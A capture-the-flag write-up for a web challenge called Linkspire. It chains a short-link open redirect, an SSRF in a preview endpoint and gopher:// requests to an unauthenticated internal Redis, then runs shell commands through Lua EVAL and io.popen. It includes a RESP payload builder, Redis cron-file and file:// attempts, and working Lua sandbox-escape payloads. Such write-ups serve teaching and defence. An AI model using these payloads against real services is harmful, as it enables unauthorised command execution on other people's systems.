# Linkspire

## Challenge info

- **Name:** Linkspire
    
- **Category:** Web
    
- **Author:** badhacker0x1
    
- **Target:** `http://23.239.30.114:8081/`
    

The challenge provides a simple link-shortening service with a preview feature.

Users can submit a URL, receive a shortened link, and ask the server to generate a preview of the destination. The preview functionality turns out to be vulnerable to SSRF, and the internal Redis service gives us a path from SSRF to command execution.

## First look

The application exposes two main features:

- shorten a URL
    
- generate a preview for a URL
    

The response headers also included:

```
X-Cache-Backend: redis
X-Powered-By: Linkspire/1.4
```

Looking at the homepage source revealed an even stronger hint:

```
<!--
  Linkspire frontend build 1.4.2
  TODO(sre): our internal redis box (redis:6379) is still wide open, no auth.
  lock it down before we go public. -devops
-->
```

So we already knew that an unauthenticated Redis instance was available internally at:

```
redis:6379
```

The main problem was finding a way to reach it from the public application.

## Understanding the short links

Submitting a URL to `/api/shorten` returned a link similar to:

```
http://localhost:5000/l/aHR0cHM6Ly9leGFtcGxlLmNvbS8xMjM
```

The final component is simply the original URL encoded with Base64URL.

For example:

```
aHR0cHM6Ly9leGFtcGxlLmNvbS8xMjM
```

decodes to:

```
https://example.com/123
```

The `/l/<token>` endpoint does not need a database lookup. It decodes the token and redirects the browser to the resulting URL.

That gives us a stateless open redirect to any destination we can encode.

## Finding the SSRF

The application also exposes:

```
/api/preview?url=
```

This endpoint fetches a URL from the server and returns information about the response.

Direct requests to internal addresses were expected to be blocked by the initial URL validation. However, the preview client followed redirects without validating the final destination again.

That allowed the following chain:

1. Give `/api/preview` a normal Linkspire URL.
    
2. The initial Linkspire URL passes validation.
    
3. `/l/<token>` redirects to an internal address.
    
4. The preview client follows the redirect.
    
5. The server fetches the internal destination.
    

I first tested the chain against the application's internal listener:

```
http://127.0.0.1:5000/
```

The preview response contained the Linkspire homepage HTML, confirming that the redirect-based SSRF worked.

## Reaching Redis

The HTML comment identified the Redis hostname as:

```
redis:6379
```

Requesting it through the SSRF produced a Redis protocol error:

```
-ERR wrong number of arguments for 'get' command
```

That response confirmed two things:

- the application container could resolve the hostname `redis`
    
- the preview request reached the Redis service on port 6379
    

A request to `127.0.0.1:6379` failed because Redis was running in a separate container rather than inside the web container itself.

## Using Gopher to send Redis commands

The preview endpoint used PycURL, which supported the Gopher protocol.

This was important because an HTTP request to Redis gives very limited control over the bytes sent. With Gopher, the URL can contain an arbitrary Redis protocol payload.

The full exploit path became:

```
/api/preview
    -> public /l/<token> redirect
    -> gopher://redis:6379/
    -> raw Redis command
```

Redis commands were encoded using the Redis Serialization Protocol, or RESP.

A command such as:

```
PING
```

becomes:

```
*1\r\n
$4\r\n
PING\r\n
```

That byte sequence can be percent-encoded and placed inside a Gopher URL.

A simple JavaScript helper for generating RESP data looked like this:

```
function makeRedisResp(args) {
  let payload = `*${args.length}\r\n`;

  for (const value of args) {
    const text = String(value);
    const length = new TextEncoder().encode(text).length;

    payload += `$${length}\r\n${text}\r\n`;
  }

  return payload;
}
```

The resulting request targeted:

```
gopher://redis:6379/_<percent-encoded RESP payload>
```

Some requests returned a timeout from the preview endpoint even though Redis had already processed the command. For example, the `PING` request timed out after receiving seven bytes, which is exactly the length of:

```
+PONG\r\n
```

So a preview timeout did not necessarily mean the Redis command failed.

## Redis reconnaissance

With arbitrary Redis commands available, I checked the database contents and configuration.

One interesting value contained a cron-style command:

```
*/1 * * * * root cat /flag* > /tmp/f_out 2>&1; redis-cli -x set result < /tmp/f_out
```

That strongly suggested a possible Redis cron-file attack:

1. Change the Redis working directory with `CONFIG SET dir`.
    
2. Change the database filename with `CONFIG SET dbfilename`.
    
3. Write cron content into Redis.
    
4. Use `SAVE` to create a cron file.
    
5. Wait for cron to run.
    
6. Read the output from the `result` key.
    

However, the writable filesystem locations did not line up with a usable cron directory.

Attempts involving locations such as these failed:

```
/var/spool/cron/crontabs/
/etc/cron.d/
/tmp/
/app/
/home/app/
/var/www/
```

Some directories did not exist, while others were not writable by the Redis process.

Redis could write to its normal data directory:

```
/var/lib/redis/
```

but placing a database file there did not provide code execution.

So the cron route was a dead end.

## Trying local file access

Since the preview endpoint already gave server-side URL fetching, I also tested the `file://` protocol against likely flag locations:

```
file:///flag
file:///flag.txt
file:///app/flag
```

Those requests returned errors such as:

```
Couldn't open file /flag
```

This did not reveal the flag, so I moved back to Redis and looked for another execution primitive.

## Redis Lua scripting

Redis supports server-side Lua scripts through the `EVAL` command.

Normally, the Lua environment is sandboxed and should not allow operating-system command execution. However, the Redis instance exposed Lua functionality that allowed access to `io.popen`.

The first payload explicitly loaded the Lua I/O library:

```
local io_l = package.loadlib(
    '/usr/lib/x86_64-linux-gnu/liblua5.1.so.0',
    'luaopen_io'
)

local io = io_l()
local f = io.popen('cat /flag*')
local result = f:read('*a')
f:close()

return result
```

This script was sent to Redis through the Gopher SSRF using:

```
EVAL <script> 0
```

Redis executed the shell command and returned:

```
$61
bdsec{Deb1an_R3d1s_lua_sandb0x_esc4pe_thr0ugh_a_g0pher_h0le}
```

A simpler Lua payload also worked:

```
return io.popen('cat /flag*'):read('*a')
```

So the available Lua environment already exposed `io.popen` without needing to load the library manually.

## Exploit chain

The complete path to the flag was:

1. Identify that short-link tokens are Base64URL-encoded destinations.
    
2. Use `/l/<token>` as an open redirect.
    
3. Pass the public redirect URL to `/api/preview`.
    
4. Let the preview client follow the redirect to a Gopher URL.
    
5. Send RESP-encoded commands to the internal Redis service.
    
6. Use Redis `EVAL` to execute Lua.
    
7. Run `cat /flag*` through `io.popen`.
    
8. Return the command output through the Redis response.
    

## Flag

```
bdsec{Deb1an_R3d1s_lua_sandb0x_esc4pe_thr0ugh_a_g0pher_h0le}
```

## Final thoughts

This was a fun exploit chain that connected several individually small weaknesses.

The shortener provided a stateless open redirect, while the preview endpoint validated only the first URL and followed redirects afterward. PycURL's Gopher support then turned SSRF into arbitrary Redis command execution.

The cron hint was useful, but the filesystem permissions prevented that route from working. Redis Lua scripting provided a cleaner alternative once `io.popen` was found to be available.

The main lesson is that SSRF defenses must validate every redirect destination, not just the original URL. Internal services such as Redis should also require authentication and should never be reachable from a generic URL-fetching feature.

